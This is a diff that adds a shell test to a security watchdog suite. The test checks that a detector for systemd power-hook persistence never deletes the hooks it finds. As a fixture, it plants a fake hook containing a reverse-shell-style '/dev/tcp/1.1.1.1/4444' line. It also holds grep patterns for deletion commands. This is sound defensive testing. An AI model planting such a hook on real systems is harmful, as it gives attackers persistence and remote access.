@@ -319,3 +319,24 @@ seed_benign() {
     bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
     [ -z "${bad}" ]
 }
+
+@test "INVARIANT (no auto-delete: systemd-power-hooks-watchdog NEVER deletes power hooks — surveillance not remediation)" {
+    # Sister to brain-wide no-auto-delete / surveillance-not-
+    # remediation INVARIANTs across L2 watchdog suites. The
+    # systemd-power-hooks-watchdog DETECTS T1546 power-event-
+    # trigger root-exec persistence but MUST NEVER emit rm/
+    # unlink commands to auto-clean the planted hook. The
+    # detected hook may be operator-legitimate (custom suspend
+    # callback for state save, custom resume callback for VPN
+    # re-connect, custom shutdown-hook for graceful service
+    # stop) — silent auto-delete would destroy operator
+    # baseline state. Surveillance, never remediation. Locks
+    # anti-data-loss contract on the systemd-power-hooks
+    # surveillance substrate.
+    seed_benign
+    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/grub-common"
+    run_wd
+    [ -f "${HOOKD}/grub-common" ]
+    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
+    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(HOOKD|HOOK|FILE|file)' "${WD}"
+}
